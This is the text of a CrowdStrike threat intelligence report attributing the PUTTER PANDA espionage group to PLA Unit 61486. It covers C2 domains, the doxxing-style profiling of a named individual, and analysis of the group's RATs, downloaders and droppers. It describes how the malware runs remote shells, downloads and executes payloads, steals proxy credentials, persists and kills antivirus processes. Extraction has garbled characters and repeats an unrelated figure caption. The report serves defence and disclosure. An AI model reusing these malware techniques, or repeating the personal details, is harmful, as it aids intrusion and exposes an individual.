      "'CrowdStrike Intelligence Report PUTTER PANDA This report is part of the series of technical and strategic reporting available to CrowdStrike Intelligence subscribers. It is being released publicly to expose a previously undisclosed PLA unit involved in cyberespionage against Western technology companies. CROWDSTRIKE GLOBAL INTELLIGENCE TEAM In May 2014, the U.S. Department of Justice charged ˜ve Chinese nationals for economic espionage against U.S. corporations. ˚e ˜ve known state actors are o˛cers in Unit 61398 of the Chinese People™s Liberation Army (PLA). In response, the Chinese government stated that the claims were ﬁabsurdﬂ and based on ﬁfabricated factsﬂ. China then went even further, stating ﬁ˚e Chinese government, the Chinese military and their relevant personnel have never engaged or participated in cyber the˝ of trade secrets.ﬂ We believe that organizations, be they governments or corporations, global or domestic, must keep up the pressure and hold China accountable until lasting change is achieved. Not only did the U.S. Government o˙er in its criminal indictment the foundation of evidence designed to prove China™s culpability in electronic espionage, but also illustrated that the charges are only the tip of a very large iceberg. ˚ose reading the indictment should not conclude that the People™s Republic of China (PRC) hacking campaign is limited to ˜ve soldiers in one military unit, or that they solely target the United States government and corporations. Rather, China™s decade-long economic espionage campaign is massive and unrelenting. ˚rough widespread espionage campaigns, Chinese threat actors are targeting companies and governments in every part of the globe. At CrowdStrike, we see evidence of this activity ˜rst-hand as our services team conducts Incident Response investigations and responds to security breaches at some of the largest organizations around the world. We have ˜rst-hand insight into the billions of dollars of intellectual property systematically leaving many of the largest corporations - o˝en times unbeknownst to their executives and boards of directors. ˚e campaign that is the subject of this report further points to espionage activity outside of Unit 61398, and reveals the activities of Unit 61486. Unit 61486 is the 12th Bureau of the PLA™s 3rd General Sta˙ Department (GSD) and is headquartered in Shanghai, China. ˚e CrowdStrike Intelligence team has been tracking this particular unit since 2012, under the codename PUTTER PANDA, and has documented activity dating back to 2007. ˚e report identi˜es Chen Ping, aka cpyy, and the primary location of Unit 61486. ˚is particular unit is believed to hack into victim companies throughout the world in order to steal corporate trade secrets, primarily relating to the satellite, aerospace and communication industries. With revenues totaling $189.2 billion in 2013, the satellite industry is a prime target for espionage campaigns that result in the the˝ of high-stakes intellectual property. While the gains from electronic the˝ are hard to quantify, stolen information undoubtedly results in an improved competitive edge, reduced research and development timetables, and insight into strategy and vulnerabilities of the targeted organization. Parts of the PUTTER PANDA toolset and tradecra˝ have been previously documented, both by CrowdStrike, and in open source, where they are referred to as the MSUpdater group. ˚is report contains details on the tactics, tools, and techniques used by PUTTER PANDA, and provides indicators and signatures that can be leveraged by organizations to protect themselves against this activity. Our Global Intelligence Team actively tracks and reports on more than 70 espionage groups, approximately half of which operate out of China and are believed to be tied to the Chinese government. ˚is report is part of our extensive intelligence library and was made available to our intelligence subscribers in April 2014, prior to the US Government™s criminal indictment and China™s subsequent refusal to engage in a constructive dialog. Targeted economic espionage campaigns compromise technological advantage, diminish global competition, and ultimately have no geographic borders. We believe the U.S. Government indictments and global acknowledgment and awareness are important steps in the right direction. In support of these e˙orts, we are making this report available to the public to continue the dialog around this ever-present threat.

The attribution provided in this report points to Chen Ping, aka cpyy (born on May 29, 1979), as an individual responsible for the domain registration for the Command and Control (C2) of PU TT ER PANDA malware. In addition to cpyy, the report identi˛es the primary location of Unit 61486. PUTT ER PANDA is a determined adversary group, conducting intelligence-gathering operations targeting the Government, Defense, Research, and Technology sectors in the United States, with speci˛c targeting of the U S Defense and European satellite and aerospace industries. The PLA ™s GSD Third Department is generally acknowledged to be China™s premier Signals Intelligence (SIGINT) collection and analysis agency, and the 12th Bureau Unit 61486, headquartered in Shanghai, supports China™s space surveillance network. Domains registered by Chen Ping were used to control PU TT ER PANDA malware. These domains were registered to an address corresponding to the physical location of the Shanghai headquarters of 12th Bureau, speci˛cally Unit 61486. The report illuminates a wide set of tools in use by the actors, including several Remote Access Tools (RAT s). The RAT s are used by the PU TT ER PANDA actors to conduct intelligence-gathering operations with a signi˛cant focus on the space technology sector. This toolset provides a wide degree of control over a victim system and can provide the opportunity to deploy additional tools at will. They focus their exploits against popular productivity applications such as Adobe Reader and Microso˝ O˙ce to deploy custom malware through targeted email attacks. This report contains additional details on the tactics, tools, and techniques used by PU TT ER PANDA, and provides indicators and signatures that can be leveraged by organizations to protect themselves against this activity. 5KEY FINDINGS Putter Panda is a cyber espionage actor that conducts operations from Shanghai, China, likely on behalf of the Chinese People™s Liberation Army (PLA ) 3rd General Sta˚ Department 12th Bureau Unit 61486. This unit is supports the space based signals intelligence (SIGINT) mission.The 12th Bureau Unit 61486, headquartered in Shanghai, is widely accepted to be China™s primary SIGINT collection and analysis agency, supporting China™s space surveillance network. This is a determined adversary group, conducting intelligence- gathering operations targeting the Government, Defense, Research, and Technology sectors in the United States, with speci˛c targeting of space, aerospace, and communications.The group has been operating since at least 2007 and has been observed heavily targeting the U S Defense and European satellite and aerospace industries. They focus their exploits against popular productivity applications such as Adobe Reader and Microso˝ O˙ce to deploy custom malware through targeted email attacks. Crowd Strike identi˛ed Chen Ping, aka cpyy, a suspected member of the PLA responsible for procurement of the domains associated with operations conducted by Putter Panda.There is infrastructure overlap with Comment Panda, and evidence of interaction between actors tied to both groups. Attribution 7ATTRIBUTION There are several pieces of evidence to indicate that the activity tracked by Crowd Strike as PU TT ER PANDA is attributable to a set of actors based in China, operating on behalf of the Chinese People™s Liberation Army (P LA ). Speci˛cally, an actor known as cpyy (Chen Ping) appears to have been involved in a number of historical PUTT ER PANDA campaigns, during which time he was likely working in Shanghai within the 12th Bureau, 3rd General Sta˚ Department (GSD). PUTT ER PANDA has several connections to actors and infrastructure tied to C OMMENT PANDA, a group previously attributed to Unit 61398 of the PLA . 8C2 INDICATORS Although some of the domains used for command and control of the tools described later in this report appear to be legitimate sites that have been compromised in some way, many of them appear to have been originally registered by the operators. Table 1 shows the domains that appear to have been registered by these actors, and the original email address used where known. Table 1. C2 Domains and Original Registrant Email Addresses 9C2 INDICATORS ˆCONT™DˇThe most signi˛cant ˛nding is that an actor known as cpyy appears to have registered a signi˛cant number of C2 domains. This actor is discussed in the next section. Many of the domains have had their registrant information changed, likely in an attempt to obfuscate the identity of the operators. For instance, several domains originally registered by cpyy had their email address updated to van.dehaim@gmail.com around the end of 2009; for siseau.com the change occurred between July 2009 and November 2009, and for vssigma.com, the change occurred between August 2009 and December 2009. Historical registrant information for anfoundation.us, rwchateau.com, and succourtion.org was not available prior to 2010, but it is likely that these domains were also originally registered to a personally attributable email account. Similarly, several domains registered to mike.johnson_mj@yahoo.com have had their registrant email updated during March 2014 (see Table 2). These registrant changes may indicate an increased awareness of operational security (OPSEC) from the PU TT ER PANDA actors. The recent changes to the domains shown in Table 2 may indicate that the operators are preparing new campaigns that make use of this infrastructure, or they are attempting to disassociate all these Although no attributable information was found on the email addresses associated with the domains described above (aside from cpyy and httpchen Œ see below), several other domains were found to have been registered by some of these addresses. These are shown in Table 3, and may be used for command and control of PU TT ER PANDA tools. domains from a single email address, perhaps due to OPSEC concerns or issues with the speci˛c email account. Table 2. New Registrant Email Addresses for Domains Original-ly Registered to mike.johnson_mj@ yahoo.com 10C2 INDICATORS ˆCONT™DˇTAR GETINGThe subdomains associated with these domains via DNS records, along with some of the domain names themselves, point to some areas of interest for the PU TT ER PANDA operators (see also Droppers in the following Technical Analysis section): sensing technology (particularly within Europe); aerospace companies; telecommunications. It is likely that PU TT ER PANDA will continue to attack targets of this nature in future intelligence- gathering operations. Table 3. Domains Associated with Registrant Emails Found in PUTT ER PANDA C2 Domains 11C2 INDICATORS ˆCONT™DˇCONNECTIONS TO OT HER ADVERSARY GROUP SCOMMENT PA NDABased on passive DNS records, several PU TT ER PANDA associated domains have resolved to IP address 100.42.216.230: Additionally, several subdomains of ujheadph.com resolved to this IP: Another subdomain of ujheadph.com has been observed2 in connection with distinctive tra˙c originating from the 3P ARA RAT (described below), making it probable that this domain is also associated with PUTT ER PANDA.The decipherment.net domains resolved to this IP address from 11 October 2012 to at least 25 February 2013, and the botanict.com domain resolved from 11 October 2012 to 24 March 2013. During part of this timeframe (30 June 2012 - 30 October 2012), a domain associated with COMMENT PANDA resolved to this same IP address: login. aolon1ine.com. Additionally, for a brief period in April 2012, update8.˛refoxupdata.com also resolved to this IP address. The use of the same IP address during the same time suggests that there is perhaps some cooperation or shared resources between C OMMENT PANDA and PUTT ER PANDA.VIXEN PA NDAAlthough not as conclusive as the links to COMMENT PANDA, IP address 31.170.110.163 was associated with VIXEN PANDA domain blog.strancorproduct.info from November to December 2013. In February 2014, this IP address was also associated with PUTT ER PANDA domain ske.hfmforum. com. While not directly overlapping, this potential infrastructure link is interesting, as VIXE N PANDA has previously displayed TT Ps similar to COMMENT PANDA (other Crowd Strike reporting describes VIXE N PANDA malware that extracts C2 commands embedded between delimiters in web content), and has extensively targeted European entities. 2See http://webcache.googleusercontent.com/search?q=cache:ZZyfzC1Y0UoJ:www.urlquery.net/report. php%3Fid%3D9771458+&cd=2&hl=en&ct=clnk&gl=uk 12 ﬁCPYYﬂSeveral email addresses have been associated with cpyy, who also appears to use the alternate handles cpiyy and cpyy.chen: The cpyy.net domain lists ﬁChen Pingﬂ as the registrant name, which may be cpyy™s real name, as this correlates with the initials ﬁcpﬂ in ﬁcpyyﬂ. A personal blog for cpyy was found at http://cpiyy.blog.163.com/. The pro˛le on this blog (shown in Figure 2 below) indicates that the user is male, was born on 25 May 1979, and works for the ﬁmilitary/policeﬂ Figure 2. cpyy Personal Blog on 163.com 13 ﬁCPYYﬂ ˆCONT™DˇThis blog contains two postings in the ﬁITﬂ category that indicate at least a passing interest in the topics of networking and programming. A related C SDN pro˛le for user cpiyy indicates that cpyy was working on or studying these topics in 2002 and 20033.Another personal blog for cpyy (http://www.tianya.cn/1569234/bbs) appears to have last been updated in 2007. This states that the user lives in Shanghai, and has a birthdate identical to that in the 163.com blog.cpyy was also active on a social networking site called XCar, stating that he lived in Shanghai as early as 2005 through 2007; he said in a post, ﬁ Soldier™s duty is to defend the country, as long as our country is safe, our military is excellentﬂ4 , indicating a feeling of patriotism that could be consistent with someone who chose a military or police-based career. Figure 3. cpyy Personal Blog on tianya.cn3See postings: http://bbs.csdn.net/users/cpiyy/topics4hxxp://www.xcar.com. cn/bbs/viewthread. php?tid=7635725&page=6 14 ﬁCPYYﬂ ˆCONT™DˇOn the XCar forum, cpyy.chen used a subforum called POLO (hacker slang for ﬁVolkswagen carsﬂ) to communicate with other users Linxder, peggycat, ﬁNaturally do not understand romanceﬂ ( ), ﬁa wolfﬂ ( ﬁlarge tileﬂ , ﬁwinterﬂ ( , ﬁchunniﬂ , papaya, kukuhaha, Cranbing, ﬁdusty subﬂ (), z11829, ﬁice star harborﬂ , ﬁpolytechnic Aberdeenﬂ ( ), ﬁI love pineapple pieﬂ (), and ﬁshe™s distantﬂ in 2007. Although super˛cially the discussion is about cars, there is a repeated word in the text, ﬁmilk yellow packageﬂ or ﬁcustard packageﬂ or ﬁyoke packageﬂ ( ). This could be a hacker slang word, but it is unclear as to the de˛nition. The conversation alludes to Linxder being the ﬁteacherﬂ or ﬁlandlordﬂ and the other aforementioned users are his ﬁstudentsﬂ. Linxder references how he has ﬁfound jobsﬂ for them. It is possible that this is a reference to hacking jobs wrapped up in car metaphors. Linxder is the handle of an actor associated with the likely Shanghai-based COMMENT PANDA group 5 . Linxder, cpyy, and xiaobai have all discussed programming and security related topics on cpyy™s site, cpyy.org 6 , which hosted a discussion forum for the 711 Network Security Team (see below).cpyy also appears to have a keen interest in photography; his 163.com blog includes several photographs taken by cpyy in the blog postings and albums section. Some of these photographs also appear in a Picasa site7 (examples are shown in Figures 5 and 6) belonging to a user cpyy.chen. An album in this site named ﬁmeﬂ has several shots of what is likely cpyy himself, from 2005, 2006, and 2007, shown to the right:Figure 4. cpyy.chen, from 2005, 2006, and 2007 (le˝ to right) 15 ﬁCPYYﬂ ˆCONT™DˇAn account on rootkit.com, a popular low-level so˝ware security site, existed for user cpyy and was accessed in at least May 2004. This account was registered with primary email address cpyy@cpyy.net and backup email address cpyy@hotmail.com; it listed a date of birth as 24 May 1979, consistent with cpyy™s other pro˛les. The IP address 218.242.252.214 was associated with this account; it is owned by the Oriental Cable Network Co., Ltd., an ISP located in Shanghai. Registration on this forum shows that cpyy had an interest in security-related programming topics, which is backed up by the postings on his personal blog and C SDN account. Figure 6. Example Photograph from 163.com BlogFigure 5. Sample Photograph from cpyy.chen™s Picasa Albums 16 ﬁCPYYﬂ ˆCONT™Dˇ711 NETWOR K SECURITY T EAM One of the sites registered to cpyy was used to host a web-based email service, along with a forum on www. cpyy.net. Both of these services were apparently run by the 711 Network Security Team (711), a group that is now likely defunct, but has previously published security-based articles that have been re-posted on popular Chinese hacking sites such as xfocus.net8. One of these articles, entitled ﬁIMD-based packet ˛ltering ˛rewall to achieve the principlesﬂ 9, is apparently authored by xiaobai, with email address xiaobai@open˛nd.com.cn; it was published on the ﬁGRAT EFULﬂ ) security digest list10 that is hosted by Shanghai Jiao Tong University (SJTU). This digest list/bulletin board was also frequented by ClassicWind, an actor possibly linked to the Shanghai-based, PLA -sponsored adversary group COMMENT PANDA, as described in. This Tipper also indicates that ﬁthe Chinese Communist Party (CCP) and the People™s Liberation Army (P LA ) aggressively target SJTU and its School of Information Security Engineering (SISE) as a source of research and student recruitment to conduct network o˚ense and defense campaignsﬂ, so it is possible that the 711 Network Security Team members came to the attention of the Chinese state via this institution.An additional connection to SJTU comes from a C2 domain, checalla.com, used with the 4H RAT in 2008. This domain was registered to httpchen@gmail. com at the time, and this address was also used to make a posting on the G RAT EFUL BBS (shown in Figure 7). The posting indicates that httpchen is located at the (Minhang) campus of SJTU and was posting using IP address 58.196.156.15, which is associated with the China Education and Research Network (CE RNET), a nationwide network managed by the Chinese Ministry of Education. It also states that httpchen is studying at the school of Information Security Engineering within SJTU.8For example, hxxp://www.xfocus.net/articles/200307/568.html 9This article also lists http://cpyy.vicp.net/ as the original source site, although no archived content could be recovered for this. 10See http://bbs.sjtu.edu.cn/bbsanc,path,/groups/GROUP_3/Security/D44039356/D69C6D2AC/D4C11F438/D6DB67E4E/DA69FF663/ M.1052844461.A.htmlFigure 7. httpchen Posting on SJTU ﬁGRAT EFULﬂ BBS 17ﬁCPYYﬂ ˆCONT™DˇMILITARY CONNECTIONSSeveral pieces of evidence indicate that cpyy probably has connections to, or is part of, the Chinese military Œ speci˛cally the PLA Army. In addition to his declaration on his personal blog that he works for the ﬁmilitary/ policeﬂ, and contacts with actors such as Linxder that have been previously associated with hacking units within the PLA , cpyy™s Picasa site contains several photographs that hint at military connections. First, a monochrome picture from the (ﬁcollegeﬂ) album posted in February 2007 shows several uniformed individuals: It is not clear whether this picture includes cpyy, or just friends/ associates/relatives. A picture from the (ﬁhigh schoolﬂ) album posted in February 2007 shows a male Œ likely cpyy based on the clothing shown in the second picture, which matches the pictures of cpyy shown above Œ performing exercise in front of a group of likely soldiers and an o˙cer: 18Although somewhat unclear, pictures from the album 2002 (ﬁ2002 birthdayﬂ), also posted in February 2007, show the celebrant (likely cpyy) in khaki clothes that are possibly military wear. The most compelling pictures, however, are found in the and albums (ﬁdormitoryﬂ and ﬁo˙ceﬂ). A shot of probably cpyy™s dormitory room shows in the background two military hats that appear to be Type 07 PLA Army o˙cer peak hats: 19This album also contains a shot of the exterior of a building with several large satellite dishes outside: This same building and the satellite dishes also appear in the ﬁo˙ceﬂ album. The re˘ection e˚ects observed on the windows of this building could be due to coatings applied to resist eavesdropping via laser microphones and to increase privacy, which would be consistent with a military installation conducting sensitive work. 20Above is an image from the same album of what appears to be a larger dish, in front of the Oriental Pearl Tower, a signi˛cant landmark in Shanghai:UNIT 61486As mentioned above, checalla.com was used for command and control with the PU TT ER PANDA 4H RAT in 2008. This domain was registered to httpchen@gmail.com, and in May 2009 the domain registration details were updated to include a Registrant Address of ﬁshanghai yuexiulu 46 45 202#ﬂ.

Further con˛rmation can be found from photos uploaded by a user on Panoramio 13 who tags the image as being located in Chabei14 , Shanghai, China (31° 17™ 18.86ﬂ N 121° 27™ 9.83ﬂ E). This image is exceptionally similar to building shown in cpyy™s ﬁo˙ceﬂ album (see Figure 11 below). 13http://www.panoramio.com/user/3305909 14Alternately Romanized as Zhabei Figure 10. Satellite Imagery of Facility Alongside Handheld Image from cpyy 23According to a public report 15 on the Chinese PLA ™s General Sta˚ Department (GSD), the 12th Bureau of the 3rd G SD is headquartered in the Zhabei district of Shanghai and ﬁappears to have a functional mission involving satellites, likely inclusive of intercept of satellite communications and possibly space-based SIGINT collectionﬂ. The same report also lists a Military Unit Cover Designator (MUCD) of 61486 for this bureau. A webpage16 published on a Chinese government site detailing theatrical performances involving members of the PLA lists an address of ﬁ ﬂ (46 Yue Xiu Road, Zhabei District) for ﬁﬂ (61486 Forces General Sta˚). A search for this location shows an identical area to that shown in Figure 8. It can therefore be concluded with high con˛dence that the location shown in cpyy™s imagery, along with the satellite images above, is the headquarters of the 12th Bureau, 3rd G SD, Chinese PLA Œ also known as Unit 61486. This unit™s suspected involvement in ﬁspace surveillanceﬂ17 and ﬁintercept of satellite communicationsﬂ ˛ts with their observed targeting preferences for Western companies producing technologies in the space and imaging/remote sensing sectors. The size and number of dishes present in the area is also consistent with these activities. 15http://project2049.net/documents/pla_third_department_sigint_cyber_stokes_lin_hsiao.pdf 16http://www.dfxj.gov.cn/xjapp/wtzyps/wtlzy/wyyjysl/zhc/zyc/bd01d910153ffb4d0115a7c12f70042e.html 17http://project2049.net/documents/china_electronic_intelligence_elint_satellite_developments_easton_stokes.pdf Figure 11. Panoramio (le˝) and cpyy Images Compared 24BINARY INDICATORSObserved build times for the PUTT ER PANDA tools described in this report range from 2007 to late 2013, indicating that the actors have conducted several campaigns against their objectives over a period of several years. A build time analysis of all known samples is shown in Figure 1 below, relative to China time. Although this shows that there is some bias in the build time distribution to daylight or working hours in China, which is more signi˛cant if a possible three-shi˝ system of hours is considered (0900-1200, 1400-1700, and 2000-2300), this evidence is not conclusive. There is also some evidence that build times are manipulated by the adversary; for example, the sample with MD5 hash bc4e9dad71b844dd3233cfbbb96c1bd3 has a build time of 18 July 2013, but was supposedly ˛rst submitted to Virus Total on 9 January 2013. This shows that the attackers Œ at least in 2013 Œ were aware of some operational security considerations and were likely taking deliberate steps to hide their origins. Figure 1. Build Time Analysis of PUTT ER PANDA Malware, Relative to China Time (UTC+8) 25CONCLUSIONSThere is strong evidence to tie cpyy, an actor who appears to have been involved in historical PUTT ER PANDA operations, to the P LA army and a location in Shanghai that is operated by the 12th Bureau, 3rd G SD of the PLA (Unit 61486). Another actor tied to this activity, httpchen, has declared publically that he was attending the School of Information Security Engineering at SJTU. This university has previously been posited as a recruiting ground for the P LA to ˛nd personnel for its cyber intelligence gathering units, and there is circumstantial evidence linked cpyy to other actors based at SJTU.Given the evidence outlined above, Crowd Strike attributes the PUTT ER PANDA group to P LA Unit 61486 within Shanghai, China with high con˛dence. It is likely that this organization is sta˚ed in part by current or former students of SJTU, and shares some resources and direction with P LA Unit 61398 (COMMENT PANDA). Technical Analysis 27Screenshot of Truecaller Database Shared by DEADEYE JACKAL on Their Twitter Account (names redacted) TECHNICAL ANALYSISSeveral RAT s are used by PU TT ER PANDA. The most common of these, the 4H RAT and the 3PARA RAT , have been documented previously by Crowd Strike in previous Crowd Strike Intelligence reporting. This analysis will be revisited below, along with an examination of two other PUTT ER PANDA tools: pngdowner and httpclient. Two droppers have been associated with the PUTT ER PANDA toolset; these are also brie˘y examined below. 4H RAT Œ EXAMPLE MD5 HASH A76419A2FCA12427C887895E12A3442BThis RAT was ˛rst analyzed by Crowd Strike in April 2012, but a historical analysis shows that it has been in use since at least 2007 by the PUTT ER PANDA actors. A listing of metadata for known samples, including C2 information, is shown in Appendix 1.The operation of this RAT is described in detail in other Crowd Strike reporting, but is useful to revisit here to highlight the characteristics of the RAT : search?qu= at www.google.com). ldd46!yo , and ˛nally nibble-wise encoded as upper-case ASCII characters in the range ( A-P) Œ e.g., the byte value 0x1F becomes ﬁBPﬂ.

Sample Python Code to Decode Hostname from User- Agent Snippet3PARA RAT Œ EXAMPLE MD5 HASH BC4E9DAD71B844DD3233CFBBB96C1BD3The 3PARA RAT was described in some detail in other Crowd Strike reporting, which examined a DLL-based sample with an exported ˛lename of ssdpsvc.dll. Other observed exported ˛lenames are msacem.dll and mrpmsg.dll, although the RAT has also been observed in plain executable (EXE) format. On startup, the RAT attempts to create a ˛le mapping named &*SDKJfhksdf89*DIUKJDSF&*sdfsdf78sdfsdf. This is used to prevent multiple instances of the RAT being executed simultaneously. The RAT will then use a byte-wise subtraction- based algorithm (using a hard-coded modulo value) to decode C2 server details consisting of a server hostname and port number, in this example nsc.adomhn. com, port 80. The decoding algorithm is illustrated in Figure 10 below. The key and modulo values vary on a per-sample basis. Decoded C2 settings, along with sample metadata, are listed in Appendix 2. 29Screenshot of Truecaller Database Shared by DEADEYE JACKAL on Their Twitter Account (names redacted) Figure 11. 3P ARA RAT Initial BeaconFigure 10. Sample Python Code Illus-trating C2 Server Decoding RoutineThe RAT is programmed in C++ using Microso˝ Visual Studio, and it makes use of the object-oriented and parallel programming features of this environment; Standard Template Library ( STL) objects are used to represent data structures such as strings and lists, and custom objects are used to represent some of the C2 command handlers (e.g., CCommandCMD). Several threads are used to handle di˚erent stages of the C2 protocol, such as receiving data from the server, decrypting data, and processing commands. Standard Windows primitives such as Events are used to synchronize across these threads, with a shared global structure used to hold state. Once running, the RAT will load a binary representation of a date/time value 13 from a ˛le C:\\\\RECYCLER\\\\restore.dat, and it will sleep until a˝er this date/time has passed. This provides a mechanism for the operators to allow the RAT to remain dormant until a ˛xed time, perhaps to allow a means of regaining access if other parts of their toolset are removed from a victim system. As with the 4H RAT , the C2 protocol used by the 3P ARA RAT is HTT P based, using both GET and POST requests. An initial request is made to the C2 server (illustrated in Figure 11 above), but the response value is e˚ectively ignored; it is likely that this request serves only as a connectivity check, as further C2 activity will only occur if this ˛rst request is successful. In this case, the RAT will transmit some basic victim information to the C2 server along with a 256-byte hash of the hard-coded string HYF54&%9&jkMCXuiS. It is likely that this request functions as a means to authenticate the RAT to the C2 server and register a new victim machine with the controller. A sample request and its structure are shown in Figure 12. 13Using the standard Windows SYSTEMTIME structure 30Screenshot of Truecaller Database Shared by DEADEYE JACKAL on Their Twitter Account (names redacted) Figure 12. Sample 3PARA RAT Second-ary Beacon/C2 Registration 14See http://msdn.microsoft.com/en-us/library/windows/desktop/bb759853(v=vs.85).aspx for details of this API, which is rarely used. 31Screenshot of Truecaller Database Shared by DEADEYE JACKAL on Their Twitter Account (names redacted) Figure 13. 3P ARA RAT Sample Tasking RequestIf this request is also successful, the RAT will attempt to retrieve tasking from the controller using a further distinctive H TT P request shown in Figure 13, repeating this request every two seconds until valid tasking is returned. 32Screenshot of Truecaller Database Shared by DEADEYE JACKAL on Their Twitter Account (names redacted) Returned tasking is decrypted using the DES algorithm in CBC mode with a key derived from the M D5 hash of the string HYF54&%9&jkMCXuiS (as used in the secondary beacon shown above). If this fails, the RAT will fall back to decoding the data using an 8-byte XOR with a key derived from data returned from the Hash Data API with the same key string. Output data produced by tasking instructions is encrypted in the same manner as it was decrypted and sent back to the C2 server via HTT P POST request to a U RI of the form /microso˝/errorpost/ default.aspx?I D=, where the I D value is a random number in decimal representation Œ as with the initial request shown in Figure 4. The set of commands supported by the RAT is somewhat limited, indicating that perhaps the RAT is intended to be used as a second-stage tool, or as a failsafe means for the attackers to regain basic access to a compromised system (which is consistent with its support for sleeping until a certain date/time). Some of the supported commands are implemented using C++ classes derived from a base CCommand class: modi˛cation timestamps. redirected over the C2 channel. However, other commands are not implemented in this way. These other commands contain functionality to: restore.dat as noted above. The use of C++ classes that inherit from a base class to carry out some of the tasking commands, along with the use of concurrency features, indicates that the developers of the RAT put some thought into the architecture and design of their tool, although the decision to implement some commands outside of the class-based framework is curious, and may indicate multiple developers worked on the RAT (or a single developer with shi˝ing preferences for his coding style). 33Screenshot of Truecaller Database Shared by DEADEYE JACKAL on Their Twitter Account (names redacted) PNGDOWNER Œ EXAMPLE MD5 HASH 687424F0923DF9049CC3A56C685EB9A5The pngdowner malware is a simple tool constructed using Microso˝ Visual Studio and implemented via single C++ source code ˛le. This sample contains a PDB path of Y:\\\\Visual Studio 2005\\\\Projects\\\\branch-downer\\\\ downer\\\\Release\\\\downer.pdb, but other similar paths Z:\\\\Visual Studio 2005\\\\Projects\\\\pngdowner\\\\ Release\\\\ pngdowner.pdb and Z:\\\\Visual Studio 2005\\\\Projects\\\\downer\\\\ Release\\\\downer.pdb have also been observed in other samples. Appendix 3 lists metadata for known pngdowner samples.Initially, the malware will perform a connectivity check to a hard-coded U RL (http://www.microso˝.com), using a constant user agent Mozilla/4.0 (Compatible; MSIE 6.0;). If this request fails, the malware will attempt to extract proxy details and credentials from Windows Protected Storage, and from the IE Credentials Store using publicly known methods15 , using the proxy credentials for subsequent requests if they enable outbound H TT P access. An initial request is then made to the hard-coded C2 server and initial U RI Œ forming a U RL of the form (in this sample) http://login.stream-media.net/˛les/xx11/index.asp?95027775, where the numerical parameter represents a random integer. A hard-coded user agent of my Agent is used for this request, and subsequent communication with the C2 server. Content returned from this request to the C2 server will be saved to a ˛le named index.dat in the user™s temporary directory (i.e., % TEMP%). This ˛le is expected to contain a single line, specifying a U RL and a ˛lename. The malware will then attempt to download content from the speci˛ed U RL to the ˛lename within the user™s temporary directory, and then execute this ˛le via the WinExec API. If this execution attempt succeeds, a ˛nal C2 request will be made Œ in this case to a U RL using the same path as the initial request (and a similarly random parameter), but with a ˛lename of success.asp. Content returned from this request will be saved to a ˛le, but then immediately deleted. Finally, the malware will delete the content saved from the ˛rst request, and exit. The limited functionality, and lack of persistence of this tool, implies that it is used only as a simple download-and-execute utility. Although the version mentioned here uses C++, along with Visual Studios Standard Template Library ( STL), older versions of the RAT (such as MD5 hash b54e91c234ec0e739ce429f47a317313), built in 2011, use plain C. This suggests that despite the simple nature of the tool, the developers have made some attempts to modify and perhaps modernize the code. Both versions contain debugging/progress messages such as ﬁdown ˛le successﬂ. Although these are not displayed to the victim, they were likely used by the developers as a simple means to verify functionality of their code. 34Screenshot of Truecaller Database Shared by DEADEYE JACKAL on Their Twitter Account (names redacted) HTT PCLIENT Œ EXAMPLE MD5 HASH 544FCA6EB8181F163E2768C81F2BA0B3Like pngdowner, the httpclient malware is a simple tool that provides a limited range of functionality and uses HTT P for its C2 channel. This malware also initially performs a connectivity check to www.microso˝.com using the hard-coded user agent Mozilla/4.0 (Compatible; M SIE 6.0;), although in this variant no attempt is made to extract proxy credentials. The malware will then connect to its con˛gured C2 infrastructure (˛le.anyo˙ce.info) and perform a H TT P request of the form shown in Figure 14 below: Content returned from the C2 server is deobfuscated by X OR™ing the content with a single byte, 0x12. The decoded data is then checked for the string runshell. If this string is not present, the C2 request is repeated every 0.5 seconds. Otherwise, a shell process is started (i.e., cmd.exe), with input/output redirected over the C2 channel. Shell commands from the server are followed by an encoded string $$$, which indicates that the shell session should continue. If the session is ended, two other commands are supported: m2b (upload ˛le) and b2m (download ˛le). Slight variations on the C2 URLs are used for di˚erent phases of the C2 interaction: Shell command: /Microso˝/errorpost<random number>/default.asp?tmp=<encoded hostname> /Microso˝Update/GetUpdate/KB<random number>/default.asp?tmp=<encoded hostname> 15Both methods are detailed here: http://securityxploded.com/iepasswordsecrets.php Figure 14. HttpClient Sample Beacon 35Screenshot of Truecaller Database Shared by DEADEYE JACKAL on Their Twitter Account (names redacted) Given the lack of a persistence mechanism and low level of sophistication, it is likely that httpclient Œ like pngdowner Œ is used as a second-stage or supplementary/backup tool. Appendix 4 lists metadata for observed httpclient samples.DROPPERS Œ RC4 AND XOR BASEDOther Crowd Strike reporting describes a dropper used by PU TT ER PANDA (abc.scr) to install the 4H RAT . This dropper uses RC4 to decrypt an embedded payload from data in an embedded resource before writing the payload to disk and executing it. Several instances of this dropper have been observed, most commonly in association with the 4H RAT , but also in relation to other tools that will be described in forthcoming reporting. Another dropper has been observed, exclusively installing the pngdowner malware (example M D5 hash 4c50457c35e2033b3a03fcbb4adac7b7). This dropper is simplistic in nature, and is compiled from a single C++ source code ˛le. It contains a Word document in plaintext (written to Bienvenue_a_ Sahaja_Yoga_ Toulouse.doc), along with an executable (Update.exe) and DLL (McUpdate.dll). The executable and DLL are both contained within the .data section of the dropper, obfuscated with a 16-byte X OR key (consisting of the bytes 0xA0 Œ 0xAF).Both the document and executable are written to disk and the executed via the ShellExecute API (using the verb ﬁopenﬂ). The executable is also installed into the ASEP registry key HKCU\\\\ So˝ware\\\\Microso˝\\\\Windows\\\\ CurrentVersion\\\\ Run, with a value named McUpdate. Finally, the dropper deletes itself via a batch ˛le. The dropped executable (M D5 hash 38a2a6782e1af29ca8cb691cf0d29a0d) primarily aims to inject the speci˛ed DLL (McUpdate.dll, MD5 hash 08c7b5501df060ccfc3aa5c8c41b452f) into a process that would normally be accessing the network, likely in order to disguise the malicious activity. Module names corresponding to Outlook Express (msinm.exe), Outlook (outlook.exe), Internet Explorer (iexplore.exe), and Firefox (˛refox.exe) are used. If Internet Explorer is used, then the malware will attempt to terminate processes corresponding to two components of Sophos Anti-Virus ( SAVAdminService.exe and SavService.exe).Four examples of these droppers were located, using a mixture of decoy P DF and Microso˝ Word documents (shown below in Figures 15-18). The common theme throughout these documents is space technology (Bienvenue_a_Sahaja_Yoga_ Toulouse.doc does not follow this trend, but could be targeted at workers at the Toulouse Space Centre, the ﬁlargest space centre in Europeﬂ ), indicating that the attackers have a keen interest in this sector, which is also re˘ected in the choice of name for some of the C2 domains used (see the Attribution section above).16The API used expects a parameter of the form char**, and is given a char* pointer to the ﬁ*/*ﬂ string, but the stack data following this pointer is not properly zeroed or cleansed before use, leading to uncontrolled memory being read as other strings. 36Screenshot of Truecaller Database Shared by DEADEYE JACKAL on Their Twitter Account (names redacted) Figure 15. ﬁIn 